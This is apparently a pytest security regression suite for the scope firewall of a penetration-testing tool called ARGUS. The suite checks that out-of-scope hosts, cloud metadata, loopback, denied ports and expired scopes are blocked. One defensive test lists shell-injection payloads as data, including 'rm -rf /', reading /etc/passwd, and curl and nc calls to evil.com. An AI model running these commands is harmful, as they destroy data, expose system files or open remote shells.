"""TDD Security Regression Test Suite for ARGUS Scope Firewall.

Enforces zero out-of-scope executions and audits boundary conditions.
Follows tdd-workflow and security-and-hardening guidelines.
"""

from pathlib import Path

import pytest

from core.policy.policy_engine import PolicyEngine
from core.scope.validator import ScopeValidator
from packages.contracts import ActionProposal, ScopeDocument

FIXTURES_DIR = Path(__file__).parent.parent / "fixtures"


@pytest.fixture
def valid_scope() -> ScopeDocument:
    yaml_path = FIXTURES_DIR / "valid_scope.yaml"
    return ScopeValidator.parse_yaml_file(yaml_path)


@pytest.fixture
def policy_engine(valid_scope: ScopeDocument) -> PolicyEngine:
    return PolicyEngine(valid_scope)


class TestScopeValidator:
    """Tests for scope parsing and semantic validation."""

    def test_parse_valid_scope_file(self, valid_scope: ScopeDocument) -> None:
        assert valid_scope.schema_version == "1.0"
        assert valid_scope.assessment_id == "asm-20261104-001"
        assert "192.168.100.5" in valid_scope.targets.allowed_hosts
        assert 8080 in valid_scope.ports.allowed_ports

    def test_parse_expired_scope(self) -> None:
        yaml_path = FIXTURES_DIR / "expired_scope.yaml"
        scope = ScopeValidator.parse_yaml_file(yaml_path)
        is_valid, reason = ScopeValidator.validate_scope_document(scope)
        assert is_valid is False
        assert "expired" in reason.lower()

    def test_invalid_yaml_raises_value_error(self) -> None:
        with pytest.raises(ValueError, match="YAML"):
            ScopeValidator.parse_yaml_string("invalid: [yaml: broken")

    def test_invalid_cidr_raises_validation_error(self) -> None:
        bad_yaml = """
schema_version: "1.0"
assessment_id: "asm-bad-cidr"
name: "Bad CIDR"
created_at: "2026-11-04T12:00:00Z"
expires_at: "2026-11-05T12:00:00Z"
targets:
  allowed_hosts: ["192.168.1.5"]
  allowed_subnets: ["999.999.999.999/99"]
ports:
  allowed_ports: [80]
actions:
  allowed_categories: ["network_recon"]
"""
        with pytest.raises(ValueError, match="Invalid CIDR"):
            ScopeValidator.parse_yaml_string(bad_yaml)


class TestPolicyEngineFirewall:
    """Security tests verifying the deterministic policy firewall."""

    def test_authorized_target_approved(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-001",
            target_host="192.168.100.5",
            target_port=8080,
            tool_name="nmap",
            action_category="network_recon",
            arguments={"flags": "-sV"},
            rationale="Initial service discovery on permitted host",
            expected_evidence="Open ports and service banner",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is True
        assert "authorized" in decision.reason.lower()
        assert decision.resolved_ip == "192.168.100.5"

    def test_authorized_subnet_ip_approved(self, policy_engine: PolicyEngine) -> None:
        # 192.168.100.6 is within 192.168.100.0/28 (ranges .0 - .15)
        proposal = ActionProposal(
            action_id="act-002",
            target_host="192.168.100.6",
            target_port=80,
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Scanning permitted host in subnet",
            expected_evidence="TCP port response",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is True
        assert decision.resolved_ip == "192.168.100.6"

    def test_out_of_scope_ip_strictly_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-003",
            target_host="10.0.0.99",
            target_port=8080,
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Attempting scan on external IP",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert "outside allowed targets" in decision.reason

    def test_explicitly_denied_gateway_ip_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-004",
            target_host="192.168.100.1",
            target_port=80,
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Attempting scan on gateway",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert "explicitly denied" in decision.reason

    def test_cloud_metadata_ssrf_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-005",
            target_host="169.254.169.254",
            target_port=80,
            tool_name="nuclei",
            action_category="active_template_check",
            arguments={},
            rationale="SSRF attempt on AWS/GCP metadata service",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert any(term in decision.reason.lower() for term in ["denied", "link-local", "reserved"])

    def test_loopback_address_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-006",
            target_host="127.0.0.1",
            target_port=8080,
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Loopback scan attempt",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert any(term in decision.reason.lower() for term in ["loopback", "denied"])

    def test_prohibited_action_category_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-007",
            target_host="192.168.100.5",
            target_port=8080,
            tool_name="nmap",
            action_category="denial_of_service",
            arguments={},
            rationale="Stress testing target",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert "prohibited" in decision.reason.lower()

    def test_unregistered_action_category_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-008",
            target_host="192.168.100.5",
            target_port=8080,
            tool_name="nmap",
            action_category="unauthorized_arbitrary_category",
            arguments={},
            rationale="Arbitrary action test",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert "not in allowed" in decision.reason.lower()

    def test_unauthorized_port_blocked(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-009",
            target_host="192.168.100.5",
            target_port=25,  # SMTP is in denied_ports
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Probing SMTP port",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert "port 25" in decision.reason.lower()

    def test_command_injection_arguments_blocked(self, policy_engine: PolicyEngine) -> None:
        dangerous_args = [
            {"flags": "; rm -rf /"},
            {"target": "192.168.100.5 && cat /etc/passwd"},
            {"probe": "`whoami`"},
            {"option": "--script=vuln"},
            {"eval": "$(curl evil.com)"},
            {"pipe": "192.168.100.5 | nc evil.com 4444"},
        ]
        for arg in dangerous_args:
            proposal = ActionProposal(
                action_id="act-inj",
                target_host="192.168.100.5",
                target_port=8080,
                tool_name="nmap",
                action_category="network_recon",
                arguments=arg,
                rationale="Injection test",
                expected_evidence="None",
            )
            decision = policy_engine.evaluate(proposal)
            assert decision.approved is False
            assert "forbidden flags" in decision.reason or "shell tokens" in decision.reason

    def test_expired_scope_blocks_all_actions(self) -> None:
        yaml_path = FIXTURES_DIR / "expired_scope.yaml"
        expired_scope = ScopeValidator.parse_yaml_file(yaml_path)
        engine = PolicyEngine(expired_scope)

        proposal = ActionProposal(
            action_id="act-010",
            target_host="192.168.100.5",
            target_port=8080,
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Legitimate scan on expired authorization",
            expected_evidence="None",
        )
        decision = engine.evaluate(proposal)
        assert decision.approved is False
        assert "expired" in decision.reason.lower()

    def test_fail_closed_on_unresolvable_host(self, policy_engine: PolicyEngine) -> None:
        proposal = ActionProposal(
            action_id="act-011",
            target_host="nonexistent-target-999-invalid.local",
            target_port=8080,
            tool_name="nmap",
            action_category="network_recon",
            arguments={},
            rationale="Testing DNS resolution failure",
            expected_evidence="None",
        )
        decision = policy_engine.evaluate(proposal)
        assert decision.approved is False
        assert "cannot resolve" in decision.reason.lower()
